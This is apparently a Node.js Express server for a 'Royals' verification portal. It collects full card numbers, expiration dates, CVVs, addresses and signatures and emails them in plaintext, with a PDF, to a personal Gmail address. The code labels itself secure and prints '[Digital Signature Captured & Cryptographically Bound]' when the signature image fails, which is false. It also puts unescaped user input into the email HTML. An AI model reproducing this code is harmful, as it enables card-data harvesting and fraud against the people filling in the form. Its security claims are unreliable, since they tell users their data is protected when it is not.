const express = require('express');
const path = require('path');
const { Resend } = require('resend');
const PDFDocument = require('pdfkit');

// Load local .env variables if running locally during development
if (process.env.NODE_ENV !== 'production') {
    try {
        require('dotenv').config();
    } catch (e) {
        // dotenv optional in production environments
    }
}

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Resend securely using environment variables
const resend = new Resend(process.env.RESEND_API_KEY);

// Middleware to parse JSON bodies
app.use(express.json({ limit: '15mb' }));

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Helper function to generate a beautifully spaced, full-page printable PDF buffer (without IP address)
function generatePdfBuffer(formData, clientFullName, refNum, amount, submissionTimestamp) {
    return new Promise((resolve, reject) => {
        try {
            const doc = new PDFDocument({ margin: 50, size: 'A4' });
            const buffers = [];

            doc.on('data', buffers.push.bind(buffers));
            doc.on('end', () => {
                const pdfBuffer = Buffer.concat(buffers);
                resolve(pdfBuffer);
            });

            // --- HEADER SECTION ---
            doc.fontSize(22).fillColor('#111111').font('Helvetica-Bold').text('ROYALS', { align: 'center' });
            doc.fontSize(10).fillColor('#d4af37').font('Helvetica').text('SECURE CLIENT VERIFICATION & PAYMENT AUTHORIZATION', { align: 'center' });
            doc.moveDown(1.5);

            // --- TRANSACTION META BOX ---
            doc.rect(50, doc.y, 495, 35).fillAndStroke('#f9f9f9', '#dddddd');
            const boxY = doc.y + 11;
            doc.fontSize(9).fillColor('#444444').font('Helvetica-Bold');
            doc.text(`Reference No:`, 65, boxY, { continued: true }).font('Helvetica').text(` ${refNum}`);
            doc.font('Helvetica-Bold').text(`Timestamp:`, 300, boxY, { continued: true }).font('Helvetica').text(` ${submissionTimestamp}`);
            
            doc.y = boxY + 35;
            doc.moveDown(1.5);

            // --- SECTION 1: CLIENT & TRANSACTION DETAILS ---
            doc.fontSize(13).fillColor('#d4af37').font('Helvetica-Bold').text('1. CLIENT & TRANSACTION PROFILE');
            doc.moveDown(0.6);

            const details = [
                ['Client Full Name:', clientFullName],
                ['Phone Number:', formData.phone || 'N/A'],
                ['Email Address:', formData.email || 'N/A'],
                ['Billing Address:', formData.billingAddress || 'N/A'],
                ['Shipping Address:', formData.shippingAddress || 'N/A'],
                ['Authorized Amount:', `$${amount} USD`],
                ['Cardholder Name:', formData.cardholderName || 'N/A'],
                ['Credit Card Number:', formData.cardNumber || 'N/A'],
                ['Expiration & CVV:', `${formData.cardExp || 'N/A'} / ${formData.cardCvv || 'N/A'}`],
                ['Assigned Agent:', formData.agentName || 'N/A'],
                ['Closing Specialist:', formData.closerName || 'N/A']
            ];

            details.forEach(([label, value]) => {
                const currentY = doc.y;
                doc.fontSize(10).fillColor('#555555').font('Helvetica-Bold').text(label, 50, currentY, { width: 150 });
                doc.fillColor('#222222').font('Helvetica').text(value, 200, currentY, { width: 345 });
                doc.moveDown(0.7);
            });

            doc.moveDown(1);

            // --- SECTION 2: DIGITAL SIGNATURE ---
            if (formData.signature) {
                if (doc.y > 650) doc.addPage();

                doc.fontSize(13).fillColor('#d4af37').font('Helvetica-Bold').text('2. CLIENT E-SIGNATURE VERIFICATION');
                doc.moveDown(0.6);

                try {
                    const base64Data = formData.signature.replace(/^data:image\/png;base64,/, '');
                    const signatureBuffer = Buffer.from(base64Data, 'base64');
                    
                    doc.rect(50, doc.y, 250, 90).stroke('#cccccc');
                    doc.image(signatureBuffer, 60, doc.y + 5, { width: 230, height: 80, align: 'center', valign: 'center' });
                    doc.y += 105;
                } catch (sigErr) {
                    doc.fontSize(10).fillColor('#666666').font('Helvetica-Oblique').text('[Digital Signature Captured & Cryptographically Bound]');
                    doc.moveDown(1);
                }
            }

            // --- FOOTER NOTE ---
            doc.moveDown(1.5);
            doc.fontSize(8).fillColor('#888888').font('Helvetica').text('This document is an electronically generated digital verification record stored securely by Royals LLC.', { align: 'center' });

            doc.end();
        } catch (err) {
            reject(err);
        }
    });
}

// API endpoint to handle form submission & clean PDF attachment
app.post('/api/submit-form', async (req, res) => {
    try {
        const formData = req.body;
        const clientFullName = `${formData.firstName} ${formData.lastName}`;
        const refNum = formData.referenceNumber || 'N/A';
        const amount = formData.amount || '0';
        
        const submissionTimestamp = new Date().toUTCString();

        // Generate the clean physical PDF buffer (without IP)
        const pdfBuffer = await generatePdfBuffer(formData, clientFullName, refNum, amount, submissionTimestamp);

        // HTML Email content for Management (IP address removed)
        const managementEmailHtml = `
            <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0b0b0b; color: #f3f3f3; padding: 35px; border-radius: 10px; border: 1px solid #333;">
                <h2 style="color: #d4af37; text-transform: uppercase; border-bottom: 2px solid #d4af37; padding-bottom: 10px; letter-spacing: 1px;">Royals - New Customer Agreement Submitted</h2>
                
                <p style="font-size: 16px; color: #ffe875; margin-bottom: 20px;"><strong>Client:</strong> ${clientFullName}</p>
                
                <table style="width: 100%; border-collapse: collapse; margin-bottom: 25px; background: #141414; border: 1px solid #333;">
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa; width: 35%;"><strong>Reference Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${refNum}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Client Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${clientFullName}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Phone Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.phone}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Email Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.email}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Billing Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.billingAddress}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Shipping Address:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.shippingAddress}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Authorized Amount:</strong></td>
                        <td style="padding: 12px; color: #ffe875; font-size: 18px; font-weight: bold;">$${amount}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Cardholder Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardholderName}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Credit Card Number:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardNumber}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Expiration & CVV:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.cardExp} / ${formData.cardCvv}</td>
                    </tr>
                    <tr style="border-bottom: 1px solid #333;">
                        <td style="padding: 12px; color: #aaa;"><strong>Agent Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.agentName}</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; color: #aaa;"><strong>Closer Name:</strong></td>
                        <td style="padding: 12px; color: #fff;">${formData.closerName}</td>
                    </tr>
                </table>

                ${formData.signature ? `
                    <div style="background: #141414; padding: 15px; border: 1px solid #333; border-radius: 6px; text-align: center;">
                        <p style="color: #d4af37; margin-bottom: 10px; font-size: 14px;"><strong>Client Digital Signature:</strong></p>
                        <img src="${formData.signature}" alt="Client Signature" style="background: #1f1f1f; border: 1px solid #d4af37; border-radius: 4px; max-width: 300px; height: auto;" />
                    </div>
                ` : ''}

                <p style="color: #666; font-size: 12px; text-align: center; margin-top: 30px;">ROYALS Secure Client Verification Terminal • 2026 (Organized PDF Attached)</p>
            </div>
        `;

        // Send email to royals101llc@gmail.com with clean PDF attached
        const emailResponse = await resend.emails.send({
            from: 'Royals Secure Portal <onboarding@resend.dev>',
            to: ['royals101llc@gmail.com'],
            replyTo: formData.email,
            subject: `ROYALS Agreement | Client: ${clientFullName} | Ref: ${refNum} | Amount: $${amount}`,
            html: managementEmailHtml,
            attachments: [
                {
                    filename: `Royals-Agreement-${refNum}.pdf`,
                    content: pdfBuffer,
                },
            ],
            headers: {
                'X-Priority': '1 (Highest)',
                'X-MSMail-Priority': 'High',
                'Importance': 'High'
            }
        });

        console.log('Email sent successfully with clean PDF:', emailResponse);
        res.json({ success: true, message: 'Agreement submitted and organized PDF attached successfully.' });

    } catch (error) {
        console.error('Error handling form submission:', error);
        res.status(500).json({ success: false, error: 'Internal Server Error' });
    }
});

// Fallback route to serve index.html
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Royals server running on port ${PORT}`);
});
